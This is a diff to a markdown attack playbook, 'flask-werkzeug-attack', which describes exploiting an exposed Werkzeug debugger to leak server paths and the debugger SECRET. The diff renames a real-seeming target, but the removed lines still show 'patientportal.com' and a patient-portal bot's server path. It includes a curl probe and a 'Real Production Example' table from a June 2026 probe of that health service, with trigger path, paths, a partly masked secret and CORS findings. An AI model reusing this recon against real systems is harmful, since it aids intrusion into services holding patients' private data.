@@ -1,7 +1,7 @@
 ---
 name: flask-werkzeug-attack
 description: Exploit Flask/Werkzeug debugger exposure for traceback and SECRET leaks.
-sources: field_recon, patientportal_com_deep_probe_june_2026
+sources: field_recon, target-health-saas_com_deep_probe_june_2026
 report_count: 1
 category: recon
 ---
@@ -45,9 +45,9 @@ The Werkzeug debugger exposes:
 
 ### 1a — Server Paths (from Traceback)
 ```
-File "/var/www/html/patient_portal_assistant_bot_live/venv/lib/python3.10/site-packages/flask/app.py"
-File "/var/www/html/patient_portal_assistant_bot_live/venv/lib/python3.10/site-packages/flask_cors/extension.py"
-File "/var/www/html/patient_portal_assistant_bot_live/venv/lib/python3.10/site-packages/..."
+File "/var/www/html/target-app-backend/venv/lib/python3.10/site-packages/flask/app.py"
+File "/var/www/html/target-app-backend/venv/lib/python3.10/site-packages/flask_cors/extension.py"
+File "/var/www/html/target-app-backend/venv/lib/python3.10/site-packages/..."
 ```
 
 ### 1b — Debugger SECRET (from HTML)
@@ -149,14 +149,14 @@ curl -sk -D- "https://target.com:PORT/sitemap.xml" | grep -i access-control
 
 ## Real Production Example
 
-### Target: patientportal.com (Port 8084, June 2026)
+### Target: target-health-saas.com (Port 8084, June 2026)
 
 | Finding | Value |
 |---------|-------|
 | Trigger path | `/sitemap.xml` (HTTP 500) |
 | Error | `NameError: name 'Response' is not defined` |
 | Framework | Flask (Python 3.10) |
-| Server path | `/var/www/html/patient_portal_assistant_bot_live/venv/lib/python3.10/site-packages/flask/app.py` |
+| Server path | `/var/www/html/target-app-backend/venv/lib/python3.10/site-packages/flask/app.py` |
 | SECRET | `vYQ93K...8cww` (exposed in HTML) |
 | Console | DISABLED (`EVALEX=false`, `CONSOLE_MODE=false`) |
 | CORS | `Access-Control-Allow-Origin: *` on error page |
